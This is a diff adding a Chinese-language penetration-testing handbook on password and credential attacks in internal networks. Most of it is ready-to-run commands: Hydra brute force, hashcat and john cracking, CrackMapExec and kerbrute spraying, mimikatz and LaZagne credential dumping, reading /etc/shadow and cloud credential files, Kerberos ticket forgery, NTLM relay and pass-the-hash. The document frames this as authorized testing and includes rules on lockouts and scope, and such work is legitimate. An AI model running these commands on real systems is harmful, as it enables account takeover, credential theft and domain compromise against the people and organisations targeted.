@@ -1,0 +1,140 @@
+# 密码攻击与凭据获取全栈（内网深化）
+
+> 深化 `内网域渗透手册.md` 的凭据面：在线攻击/离线破解/喷射/Kerberos/NTLM/PtH。**红线**：密码攻击只对授权目标；喷射控制节奏防锁号；破解在本地离线进行（不占目标资源）。
+
+## 一、攻击生命周期
+
+```
+发现面（登录口/凭据存储/协议） → 收集（用户列表/服务清单/样本）
+  → 在线攻击（少而准）或 离线破解（拿 hash 后本地）
+  → 凭据使用（PtH/PtT/登录） → 横向（见内网手册）
+```
+
+**原则**：能拿 hash 离线破解的绝不在线爆破；在线先喷射后爆破（低调优先）。
+
+## 二、在线密码攻击
+
+```bash
+# Hydra 多协议
+hydra -L users.txt -P pass.txt ssh://<t> -t 4
+hydra -L users.txt -P pass.txt smb://<t> -t 4
+hydra -L users.txt -P pass.txt https-post-form "/login:user=^USER^&pass=^PASS^:F=Login failed"
+
+# HTTP/2/API 登录（burp intruder 优先，行为更可控）
+# 每账号限次数（防锁定），失败即停等
+```
+
+**技巧**：先拿用户列表（公开信息/报错差异/注册枚举）再打；目标会话锁定机制先摸清（锁定后立刻停）。
+
+## 三、离线 Hash 破解
+
+```bash
+# 识别 hash
+hashid 'hash' / name-that-hash
+
+# Hashcat（GPU）
+hashcat -m 1000 hash.txt rockyou.txt        # NTLM
+hashcat -m 5600 hash.txt rockyou.txt        # NetNTLMv2
+hashcat -m 13100 hash.txt rockyou.txt       # Kerberoast TGS
+hashcat -m 18200 hash.txt rockyou.txt       # AS-REP
+hashcat -m 22000 hash.txt handshake.hcxpcapng  # WPA2 握手
+
+# John（CPU 兜底）
+john --wordlist=rockyou.txt hash.txt
+
+# 规则生成（复用现有密码变体）
+hashcat -m 1000 hash.txt rules.txt --rules=best64
+```
+
+**注意**：破解在**自己机器**进行（GPU），不占用目标资源；结果只用于验证凭据有效性，不用于未授权访问。
+
+## 四、密码喷射（域内首选打法）
+
+```bash
+# CrackMapExec / NetExec 喷射（每密码打所有用户，不每用户爆破）
+crackmapexec smb <targets> -u users.txt -p 'Password1' --continue-on-success
+crackmapexec smb <targets> -u users.txt -p passlist.txt --no-bruteforce  # 一密码一用户
+
+# Kerberos 喷射（低调，不触发账户锁定）
+python3 kerbrute.py -users users.txt -passwords pass.txt -domain corp.local
+```
+
+**纪律**：
+- 一次只试 1-3 个密码（每密码全用户）；间隔时间拉开
+- 观察账户锁定策略（domain policy lockout threshold）；接近阈值即停
+- 命中即停剩余尝试；通知目标重置（授权流程）
+
+## 五、凭据提取（已控主机）
+
+### Windows
+```powershell
+# 内存: LSASS（需 SYSTEM 或 SeDebugPrivilege）
+mimikatz privilege::debug sekurlsa::logonpasswords
+# SAM（需 SYSTEM）: mimikatz lsadump::sam
+# DPAPI: SharpDPAPI / mimikatz dpapi::chrome
+# 浏览器/Lazagne: lazagne.exe all
+# 配置文件/脚本: dir /s /b *.config *.xml *.ps1 | findstr /i "password"
+```
+
+### Linux
+```bash
+# 历史与配置
+cat ~/.bash_history; grep -r "password\|passwd" /etc /opt /var/www 2>/dev/null
+# SSH 密钥: find / -name 'id_rsa' -o -name '*.pem'
+# 进程环境变量: cat /proc/*/environ | grep -i secret
+# shadow 读取（root 后）: cat /etc/shadow
+# 云凭证: ~/.aws/credentials, ~/.config/gcloud, ~/.aliyun/config.json
+```
+
+## 六、Kerberos 攻击（域内核心）
+
+| 攻击 | 原理 | 命令 |
+|------|------|------|
+| AS-REP Roasting | 无预认证账户的 AS-REP 可离线爆破 | `GetNPUsers.py domain/ -usersfile users.txt` |
+| Kerberoasting | 服务账户 TGS-REP 哈希离线爆破 | `GetUserSPNs.py domain/ -request` |
+| 委派滥用 | 非约束/约束委派提权 | `findDelegation.py`、rubeus dump |
+| 黄金票据 | krbtgt 哈希伪造任意用户 TGT | `ticketer.py` + `kerberos::ptt` |
+| 白银票据 | 服务 NTLM 伪造服务票据 | `ticketer.py -spn` 系 |
+| 钻石/蓝宝石票据 | 从合法票据改造（更隐蔽） | 2026 新演化 |
+| PAC 签名绕过 | 老域控 PAC 校验缺陷 | 版本自查新 CVE |
+
+**纪律**：票据伪造只做**证明存在**（列出凭据能力），不实际冒充他人产生业务动作。
+
+## 七、NTLM 攻击
+
+- **Responder 中继**（内网捕获 NetNTLM）：`responder -I eth0 -dwP`（避免污染生产环境，仅在隔离网段/演练）
+- **NTLM Relay**：中继到 SMB/LDAP → 打打印服务器/ADCS（ESC8）
+- **强制认证**：邮箱/文件共享/图标触发 SMB 认证
+
+## 八、Pass-the-Hash / Pass-the-Ticket
+
+```bash
+# PtH（NTLM 哈希直接登录）
+crackmapexec smb <t> -u admin -H <NTLM_HASH>
+pth-winexe -U admin%<hash> //<t> cmd
+
+# PtT（票据注入）
+mimikatz kerberos::ptt ticket.kirbi
+rubeus.exe ptt /ticket:base64
+
+# Over-Pass-the-Hash（哈希转 TGT）
+rubeus.exe asktgt /user:admin /rc4:<hash>
+```
+
+## 九、自动化工具链
+
+| 工具 | 用途 |
+|------|------|
+| CrackMapExec / NetExec | 喷射+横向主力（SMB/WinRM/LDAP） |
+| BloodHound / PlumHound | 域路径分析（谁到 DC 最近） |
+| kerbrute / GetUserSPNs | Kerberos 面 |
+| mimikatz / Rubeus | Windows 凭证/票据 |
+| hashcat / john | 离线破解 |
+| lazagne / LaZagne | 凭据提取 |
+
+## 十、红线（本手册重中之最）
+1. **授权前提**：密码攻击只对授权目标；360 认证过的渗透/SRC 平台范围
+2. **防锁定**：喷射低频、观测锁定阈值、命中即停——锁真实用户=事故
+3. **凭据只验证不滥用**：拿到的凭据用于路径证明（能登哪个系统），不做未授权数据操作
+4. 离线破解在自己机器；响应器类工具只在隔离演练网段
+5. 报告：命中凭据打码（只写用户名+权限面，不附明文密码），修复建议（MFA/强密码/服务账户轮换/喷射检测）
